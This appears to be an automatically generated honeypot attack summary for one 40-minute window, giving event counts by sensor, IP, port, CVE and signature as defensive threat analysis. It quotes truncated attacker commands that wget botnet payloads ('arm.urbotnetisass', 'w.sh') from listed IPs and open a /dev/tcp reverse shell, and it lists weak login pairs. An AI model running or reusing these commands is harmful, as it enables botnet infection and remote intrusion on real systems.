
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T21:01:22Z
**Timeframe:** 2025-09-29T20:20:01Z to 2025-09-29T21:00:01Z
**Files Used:**
- agg_log_20250929T202001Z.json
- agg_log_20250929T204001Z.json
- agg_log_20250929T210001Z.json

## Executive Summary

This report summarizes 8,665 malicious events recorded across the honeypot network. The majority of attacks were captured by the Honeytrap, Suricata, Cowrie, and Ciscoasa honeypots. A significant portion of the attacks originated from a small number of IP addresses, with a notable concentration on ports 25 (SMTP), 22 (SSH), 8333 (Bitcoin), and 80 (HTTP). Attackers attempted to exploit several vulnerabilities, with a focus on older CVEs. A variety of commands were executed, primarily related to downloading and executing malicious scripts.

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 2606
- Suricata: 1593
- Cowrie: 1572
- Ciscoasa: 1434
- Mailoney: 894
- Tanner: 180
- Dionaea: 154
- ConPot: 66
- Adbhoney: 62
- Redishoneypot: 47
- H0neytr4p: 21
- Sentrypeer: 16
- Dicompot: 7
- Heralding: 6
- Honeyaml: 3
- ElasticPot: 2
- ssh-rsa: 2

### Top Attacking IPs
- 86.54.42.238: 821
- 185.156.73.167: 374
- 185.156.73.166: 371
- 92.63.197.55: 362
- 92.63.197.59: 332
- 137.184.169.79: 388
- 103.144.87.192: 241
- 23.26.80.245: 161
- 134.199.197.102: 169
- 157.230.40.53: 101

### Top Targeted Ports/Protocols
- 25: 894
- 22: 230
- 8333: 190
- 80: 180
- 445: 67
- 1025: 58
- 6379: 47

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012: 9
- CVE-1999-0265: 5
- CVE-2019-11500 CVE-2019-11500: 5
- CVE-2002-1149: 5
- CVE-2021-3449 CVE-2021-3449: 4
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 4
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1

### Commands Attempted by Attackers
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`: 6
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.44/w.sh; ...`: 4
- `./upnpsetup`: 2
- `system`: 2
- `shell`: 2
- `q`: 2
- `uname -s -v -n -r -m`: 2
- `chmod +x clean.sh; sh clean.sh; ...`: 1
- `nohup bash -c "exec 6<>/dev/tcp/47.76.104.56/60111 ..."`: 1

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1: 406
- 2402000: 406
- ET SCAN NMAP -sS window 1024: 221
- 2009582: 221
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 90
- 2023753: 90

### Users / Login Attempts
- A wide variety of usernames and passwords were attempted. The most frequent attempts (2 each) were: `a2billinguser/`, `root/`, `admin/Qwerty1`, `root/54trgfbv`, `test/123`, `telnet/telnet`, `telnet/abc123`, `telnet/abcd123`, `telnet/abcd1234`, `telnet/abc1234`, `node/node`, `bob/`, `test123/test123`, `mapr/mapr`.

### Files Uploaded/Downloaded
- sh: 98
- wget.sh;: 16
- arm.urbotnetisass;: 6
- arm.urbotnetisass: 6
- arm5.urbotnetisass;: 6
- arm5.urbotnetisass: 6

### HTTP User-Agents
- No HTTP User-Agents were logged in this period.

### SSH Clients and Servers
- No specific SSH clients or servers were logged in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were logged in this period.

## Key Observations and Anomalies

- **Concentrated Attacks:** A small number of IP addresses are responsible for a large volume of the attack traffic, suggesting targeted or automated campaigns.
- **Botnet Activity:** The repeated use of `wget` and `curl` to download and execute shell scripts from specific URLs is indicative of botnet propagation. The file names `arm.urbotnetisass`, `w.sh`, and `c.sh` are likely associated with specific malware families.
- **Exploitation of Older Vulnerabilities:** The CVEs being targeted are relatively old, indicating that attackers are scanning for unpatched and legacy systems.
- **Lack of Sophistication:** The majority of the observed attacks are automated and unsophisticated, relying on common vulnerabilities and weak credentials.
- **Inconsistent Logging:** Some fields such as HTTP User-Agents, SSH clients/servers, and AS organizations were not populated in the logs for this period.
